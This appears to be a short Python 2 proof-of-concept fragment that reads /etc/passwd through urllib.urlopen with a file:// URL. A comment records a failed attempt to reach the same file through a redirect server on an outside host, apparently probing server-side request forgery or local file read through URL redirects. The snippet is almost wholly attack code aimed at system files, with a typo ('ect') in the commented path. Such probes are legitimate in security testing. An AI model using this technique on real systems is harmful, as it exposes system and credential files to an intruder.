import urllib

page = urllib.urlopen("file:///etc/passwd")#unfortunatly not working --> ("https://beerpwn.it/redirect_server.php?r=file:///ect/passwd")
contents = page.read()
print(contents)
